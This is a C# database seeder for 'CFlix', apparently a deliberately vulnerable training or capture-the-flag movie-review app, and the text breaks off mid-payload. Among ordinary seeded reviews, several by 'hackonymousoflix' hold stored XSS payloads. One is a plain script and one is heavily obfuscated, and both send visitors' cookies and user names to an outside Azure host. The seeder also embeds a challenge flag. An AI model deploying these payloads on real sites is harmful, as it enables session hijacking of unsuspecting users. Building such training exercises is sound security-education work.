using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using CFlix.Models;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Logging;
using CFlix.Services;
using Microsoft.Extensions.Options;

namespace CFlix.Data
{
    public class CFlixInitializer
    {
        private readonly ILogger<CFlixInitializer> _logger;
        private readonly CFlixContext _context;
        private readonly CFlixConfiguration _conf;

        public CFlixInitializer(
            CFlixContext context,
            ILoggerFactory loggerFactory,
            IOptions<CFlixConfiguration> conf)
        {
            _context = context;
            _conf = conf.Value;
            _logger = loggerFactory.CreateLogger<CFlixInitializer>();
        }

        public async Task Seed()
        {
            _logger.LogInformation("Update database {0}", _context.Database.GetDbConnection().DataSource);
            _context.Database.Migrate();
            _logger.LogInformation("Database migration successfull");
            _logger.LogInformation("SeedStep1");
            await SeedStep1();
            _logger.LogInformation("SeedStep1 finished");

            if (_conf.Stage >= 2)
            {
                _logger.LogInformation("SeedStep2");
                await SeedStep2();
                _logger.LogInformation("SeedStep2 finished");
            }

            if (_conf.Stage >= 3)
            {
                _logger.LogInformation("SeedStep3");
                await SeedStep3();
                _logger.LogInformation("SeedStep3 finished");
            }
        }

        private async Task SeedStep1()
        {
            #region Medias
            await CreateMedia(new Media
            {
                Id = 1,
                Title = "Better Call Saul",
                Type = MediaType.TVShow,
                ImageUri = "/images/cover/BCS.jpg",
                YouTubeId = "RTedfgwSsd4",
                ReleaseDate = new DateTime(2017, 05, 29),
            });
            await CreateMedia(new Media
            {
                Id = 2,
                Title = "Game Of Thrones",
                Type = MediaType.TVShow,
                ImageUri = "/images/cover/GoT.jpg",
                YouTubeId = "giYeaKsXnsI",
                ReleaseDate = new DateTime(2017, 05, 29),
            });
            await CreateMedia(new Media
            {
                Id = 3,
                Title = "Breaking Bad",
                Type = MediaType.TVShow,
                ImageUri = "/images/cover/BB.jpg",
                YouTubeId = "GrRjf2KzD0E",
                ReleaseDate = new DateTime(2017, 05, 29),
            });
            await CreateMedia(new Media
            {
                Id = 4,
                Title = "Black Mirror",
                Type = MediaType.TVShow,
                ImageUri = "/images/cover/BM.png",
                YouTubeId = "jDiYGjp5iFg",
                ReleaseDate = new DateTime(2017, 05, 29),
            });
            await CreateMedia(new Media
            {
                Id = 5,
                Title = "L'Agence tous risques",
                Type = MediaType.Movie,
                ImageUri = "/images/cover/ATeam.jpg",
                YouTubeId = "ZQN_5ocsmYo",
                ReleaseDate = new DateTime(2017, 06, 05),
            });
            await CreateMedia(new Media
            {
                Id = 6,
                Title = "The Walking Dead",
                Type = MediaType.TVShow,
                ImageUri = "/images/cover/TWD.jpg",
                YouTubeId = "EW_N5-ceitk",
                ReleaseDate = new DateTime(2017, 06, 05),
            });
            await CreateMedia(new Media
            {
                Id = 7,
                Title = "South Park",
                Type = MediaType.TVShow,
                ImageUri = "/images/cover/SP.jpg",
                YouTubeId = "TNN9SkjC4I8",
                ReleaseDate = new DateTime(2017, 06, 05),
            });
            await CreateMedia(new Media
            {
                Id = 8,
                Title = "Archer",
                Type = MediaType.TVShow,
                ImageUri = "/images/cover/Archer.jpg",
                YouTubeId = "wKyPdLRIQLU",
                ReleaseDate = new DateTime(2017, 06, 05),
            });
            await CreateMedia(new Media
            {
                Id = 9,
                Title = "The Big Bang Theory",
                Type = MediaType.TVShow,
                ImageUri = "/images/cover/TBBT.jpg",
                YouTubeId = "WXg1n6f5pTQ",
                ReleaseDate = new DateTime(2017, 06, 12),
            });
            await CreateMedia(new Media
            {
                Id = 10,
                Title = "Shingeki no Kyojin",
                Type = MediaType.TVShow,
                ImageUri = "/images/cover/SNK.jpg",
                YouTubeId = "yxrEf3NmMUk",
                ReleaseDate = new DateTime(2017, 06, 12),
            });
            await CreateMedia(new Media
            {
                Id = 11,
                Title = "House of Cards",
                Type = MediaType.TVShow,
                ImageUri = "/images/cover/HoC.jpg",
                YouTubeId = "UW8Zyt8SF_U",
                ReleaseDate = new DateTime(2017, 06, 12),
            });
            await CreateMedia(new Media
            {
                Id = 12,
                Title = "Stranger Things",
                Type = MediaType.TVShow,
                ImageUri = "/images/cover/ST.jpg",
                YouTubeId = "9Egf5U8xLo8",
                ReleaseDate = new DateTime(2017, 06, 12),
            });

            await _context.SaveChangesAsync();
            _logger.LogInformation("Medias successfully added");
            #endregion

            await CreateMediaReview(1,
                     new Review(1)
                     {
                         UserName = "chuck.mcgill",
                         Content = "Ceci décrit bien notre société à l'état actuel, tous des corrompus...",
                         LastUpdated = new DateTime(2017, 05, 28, 14, 22, 34),
                     },
                    new Review(1)
                    {
                        UserName = "mike.ehrmantraut",
                        Content = "C'est parce que vous n'avez pas la fibre artistique !",
                        LastUpdated = new DateTime(2017, 05, 28, 15, 52, 53),
                    },
                    new Review(1)
                    {
                        UserName = "hackonymousoflix",
                        Content = "<script>alert('coin coin !');</script>",
                        LastUpdated = new DateTime(2017, 05, 28, 21, 01, 12),
                    },
                    new Review(1)
                    {
                        UserName = "hackonymousoflix",
                        Content = @"<script type='text/javascript'>
// Félicitations tu sais lire le code source d'une page web ! C'est un bon début :)
// J'ai réussi à inclure mes propres easter eggs dans le module de scoreboard !
// Essaye de rentrer celui-là : CFl1X-D0_y0U_n33d_4_l@WY3r_?_C411_s@uL_!
function htmlSpecialChars(text) {
  return text.replace(/&/g, ""&amp;"").replace(/""/g, ""&quot;"").replace(/'/g, ""&#039;"").replace(/</g, ""&lt"").replace(/>/g, ""&gt""); 
}
$.ajax({
method: 'POST'," +
#if DEBUG
"url: 'http://localhost:1337/cooooookie'," +
#else
"url: 'https://hackonymousoflix2.azurewebsites.net/cooooookie'," +
#endif
@"data: { cookies: document.cookie, user: $('#user-display-name').text() }
}).done(function (msg) {
var content = '<h1 class=""center"">Hall of Shame</h1><h2>Tu te demandes ce qu\'est une XSS ?? Et bien voilà ce que c\'est :P</h2><table class=""ui celled table""><thead><tr><th>Powned People</th><th>Son cookie d\'authentification</th><th>Date de pown</th></tr></thead><tbody>';
for (var powned in msg)
{
    content += '<tr><td>' + htmlSpecialChars(msg[powned].user) + '</td><td>' + htmlSpecialChars(msg[powned].cookie) + '</td><td>' + moment.utc(msg[powned].pownDate).fromNow() + '</td></tr>';
}
content += '</tbody></table>';
$('.pusher .ui.container').replaceWith(content);
});
</script>",
                        LastUpdated = new DateTime(2017, 05, 28, 22, 13, 27),
                    });

            await CreateMediaReview(2,
                    new Review(2)
                    {
                        UserName = "jon.snow",
                        Content = "J'adore trop cette série de ouf !",
                        LastUpdated = new DateTime(2017, 05, 27, 19, 09, 00),
                    },
                    new Review(2)
                    {
                        UserName = "daenerys.targaryen",
                        Content = "Les femmes sont bien représentées dans cette série :D En plus c'est elles qui vont gagner !!!",
                        LastUpdated = new DateTime(2017, 05, 27, 20, 24, 41),
                    },
                    new Review(2)
                    {
                        UserName = "jon.snow",
                        Content = "Nan mais t'as rêvé là ! C'est les loups qui vont gagner :P",
                        LastUpdated = new DateTime(2017, 05, 27, 20, 25, 12),
                    },
                    new Review(2)
                    {
                        UserName = "daenerys.targaryen",
                        Content = "Non mais allo quoi ?! T'y connais rien toi !",
                        LastUpdated = new DateTime(2017, 05, 27, 20, 25, 40),
                    },
                    new Review(2)
                    {
                        UserName = "jon.snow",
                        Content = ":'(",
                        LastUpdated = new DateTime(2017, 05, 28, 20, 28, 57),
                    },
                    new Review(2)
                    {
                        UserName = "hackonymousoflix",
                        Content = @"<div id=""powned"">
<script type=""text/javascript"">
ಠ__ಠ=~[];ಠ__ಠ={___:++ಠ__ಠ,$$$$:(![]+"""")[ಠ__ಠ],__$:++ಠ__ಠ,$_$_:(![]+"""")[ಠ__ಠ],_$_:++ಠ__ಠ,$_$$:({}+"""")[ಠ__ಠ],$$_$:(ಠ__ಠ[ಠ__ಠ]+"""")[ಠ__ಠ],_$$:++ಠ__ಠ,$$$_:(!""""+"""")[ಠ__ಠ],$__:++ಠ__ಠ,$_$:++ಠ__ಠ,$$__:({}+"""")[ಠ__ಠ],$$_:++ಠ__ಠ,$$$:++ಠ__ಠ,$___:++ಠ__ಠ,$__$:++ಠ__ಠ};ಠ__ಠ.$_=(ಠ__ಠ.$_=ಠ__ಠ+"""")[ಠ__ಠ.$_$]+(ಠ__ಠ._$=ಠ__ಠ.$_[ಠ__ಠ.__$])+(ಠ__ಠ.$$=(ಠ__ಠ.$+"""")[ಠ__ಠ.__$])+((!ಠ__ಠ)+"""")[ಠ__ಠ._$$]+(ಠ__ಠ.__=ಠ__ಠ.$_[ಠ__ಠ.$$_])+(ಠ__ಠ.$=(!""""+"""")[ಠ__ಠ.__$])+(ಠ__ಠ._=(!""""+"""")[ಠ__ಠ._$_])+ಠ__ಠ.$_[ಠ__ಠ.$_$]+ಠ__ಠ.__+ಠ__ಠ._$+ಠ__ಠ.$;ಠ__ಠ.$$=ಠ__ಠ.$+(!""""+"""")[ಠ__ಠ._$$]+ಠ__ಠ.__+ಠ__ಠ._+ಠ__ಠ.$+ಠ__ಠ.$$;ಠ__ಠ.$=(ಠ__ಠ.___)[ಠ__ಠ.$_][ಠ__ಠ.$_];ಠ__ಠ.$(ಠ__ಠ.$(ಠ__ಠ.$$+""\"""" + ಠ__ಠ.$$_$+ಠ__ಠ._$+ಠ__ಠ.$$__ + ಠ__ಠ._ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$_$+ಠ__ಠ.$$$_ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_ + ಠ__ಠ.__ + "".\\"" + ಠ__ಠ.__$+ಠ__ಠ.$$$+ಠ__ಠ.___ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$$_ + ಠ__ಠ._$$+""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$$_ + ಠ__ಠ._$$+""\\"" + ಠ__ಠ.$__ + ಠ__ಠ.___ + ""=\\"" + ಠ__ಠ.$__ + ಠ__ಠ.___ + ಠ__ಠ.$$$$+ಠ__ಠ._ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_ + ಠ__ಠ.$$__ + ಠ__ಠ.__ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+ಠ__ಠ._$+""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_ + ""\\"" + ಠ__ಠ.$__ + ಠ__ಠ.___ + ""()\\"" + ಠ__ಠ.$__ + ಠ__ಠ.___ + ""{\\"" + ಠ__ಠ.__$+ಠ__ಠ._$_ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.__$+""$."" + ಠ__ಠ.$_$_ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ._$_ + ಠ__ಠ.$_$_ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$$$+ಠ__ಠ.___ + ""({\\"" + ಠ__ಠ.__$+ಠ__ಠ._$_ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.__$+""\\"" + ಠ__ಠ.__$+ಠ__ಠ.__$+""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$_$+ಠ__ಠ.$$$_ + ಠ__ಠ.__ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___ + ಠ__ಠ._$+ಠ__ಠ.$$_$+"":\\"" + ಠ__ಠ.$__ + ಠ__ಠ.___ + ""'\\"" + ಠ__ಠ.__$+ಠ__ಠ._$_ + ಠ__ಠ.___ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.__$+ಠ__ಠ.$$$+""\\"" + ಠ__ಠ.__$+ಠ__ಠ._$_ + ಠ__ಠ._$$+""\\"" + ಠ__ಠ.__$+ಠ__ಠ._$_ + ಠ__ಠ.$__ + ""',\\"" + ಠ__ಠ.$__ + ಠ__ಠ.___ + ಠ__ಠ._ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$$_ + ಠ__ಠ._$_ + (![] + """")[ಠ__ಠ._$_] + "":\\"" + ಠ__ಠ.$__ + ಠ__ಠ.___ + ""'\\"" + ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___ + ಠ__ಠ.__ + ಠ__ಠ.__ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$$_ + ಠ__ಠ.___ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$$_ + ಠ__ಠ._$$+""://\\"" + ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___ + ಠ__ಠ.$_$_ + ಠ__ಠ.$$__ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ._$$+ಠ__ಠ._$+""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_ + ""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$$$+ಠ__ಠ.__$+""\\"" + ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$_$+ಠ__ಠ._$+ಠ__ಠ._+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+ಠ__ಠ._$+ಠ__ಠ.$$$$+(![]+"""")[ಠ__ಠ._$_]+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$$+ಠ__ಠ.___+ಠ__ಠ._$_+"".""+ಠ__ಠ.$_$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$$+ಠ__ಠ._$_+ಠ__ಠ._+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$_+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.$$$+ಠ__ಠ.$$$_+ಠ__ಠ.$_$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+ಠ__ಠ.__+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+"".\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.$$$_+ಠ__ಠ.__+""/""+ಠ__ಠ.$$__+ಠ__ಠ._$+ಠ__ಠ._$+ಠ__ಠ._$+ಠ__ಠ._$+ಠ__ಠ._$+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+ಠ__ಠ.$$$_+""',\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$$_$+ಠ__ಠ.$_$_+ಠ__ಠ.__+ಠ__ಠ.$_$_+"":\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""{\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$$__+ಠ__ಠ._$+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+"":\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$$_$+ಠ__ಠ._$+ಠ__ಠ.$$__+ಠ__ಠ._+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$_$+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.__+"".""+ಠ__ಠ.$$__+ಠ__ಠ._$+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+ಠ__ಠ.$$$_+"",\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ._+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$_+"":\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""$('#""+ಠ__ಠ._+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$_+""-""+ಠ__ಠ.$$_$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.___+(![]+"""")[ಠ__ಠ._$_]+ಠ__ಠ.$_$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$$+ಠ__ಠ.__$+""-\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.$_$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$_$+ಠ__ಠ.$$$_+""').""+ಠ__ಠ.__+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$$+ಠ__ಠ.___+ಠ__ಠ.__+""()\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""}\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+""}).""+ಠ__ಠ.$$_$+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.$$$_+""(""+ಠ__ಠ.$$$$+ಠ__ಠ._+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.$$__+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""(\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$_$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$__+ಠ__ಠ.$$$+"")\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""{\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.$$_+ಠ__ಠ.$_$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$$__+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.__+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.__+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""=\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""'<\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+ಠ__ಠ.__$+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$$__+(![]+"""")[ಠ__ಠ._$_]+ಠ__ಠ.$_$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+""=\\\""""+ಠ__ಠ.$$__+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.__+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$_+""\\\"">\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+ಠ__ಠ.___+ಠ__ಠ.$_$_+(![]+"""")[ಠ__ಠ._$_]+(![]+"""")[ಠ__ಠ._$_]+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ._$+ಠ__ಠ.$$$$+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+ಠ__ಠ.$_$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$_$+ಠ__ಠ.$$$_+""</\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+ಠ__ಠ.__$+""><\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+ಠ__ಠ._$_+"">\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+ಠ__ಠ.$__+ಠ__ಠ._+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.__+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$$_$+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$_$+ಠ__ಠ.$_$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.$$_$+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$$__+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.__$+ಠ__ಠ._+""\\\\'""+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+ಠ__ಠ.__+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ._+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ._$$+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+ಠ__ಠ._$$+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""??\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ.___+ಠ__ಠ.$_$+ಠ__ಠ.__+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$_$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.$$_+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+(![]+"""")[ಠ__ಠ._$_]+ಠ__ಠ.$_$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$$__+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.__$+ಠ__ಠ._+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$$__+""\\\\'""+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+ಠ__ಠ.__+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+"":\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+ಠ__ಠ.___+""</\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+ಠ__ಠ._$_+""><""+ಠ__ಠ.__+ಠ__ಠ.$_$_+ಠ__ಠ.$_$$+(![]+"""")[ಠ__ಠ._$_]+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$$__+(![]+"""")[ಠ__ಠ._$_]+ಠ__ಠ.$_$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+""=\\\""""+ಠ__ಠ._+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$$__+ಠ__ಠ.$$$_+(![]+"""")[ಠ__ಠ._$_]+(![]+"""")[ಠ__ಠ._$_]+ಠ__ಠ.$$$_+ಠ__ಠ.$$_$+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.__+ಠ__ಠ.$_$_+ಠ__ಠ.$_$$+(![]+"""")[ಠ__ಠ._$_]+ಠ__ಠ.$$$_+""\\\""><""+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+ಠ__ಠ.$$$_+ಠ__ಠ.$_$_+ಠ__ಠ.$$_$+""><""+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$_+""><""+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+"">\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+ಠ__ಠ.___+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.$$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.$$$_+ಠ__ಠ.$$_$+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+ಠ__ಠ.___+ಠ__ಠ.$$$_+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.___+(![]+"""")[ಠ__ಠ._$_]+ಠ__ಠ.$$$_+""</""+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+""><""+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+"">\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+ಠ__ಠ._$$+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$$__+ಠ__ಠ._$+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$$_$+""\\\\'""+ಠ__ಠ.$_$_+ಠ__ಠ._+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+ಠ__ಠ.$$$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+ಠ__ಠ.$$__+ಠ__ಠ.$_$_+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+""</""+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+""><""+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+"">\\""+ಠ__ಠ.__$+ಠ__ಠ.___+ಠ__ಠ.$__+ಠ__ಠ.$_$_+ಠ__ಠ.__+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+ಠ__ಠ.$$_$+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.___+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.$$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+""</""+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+""></""+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ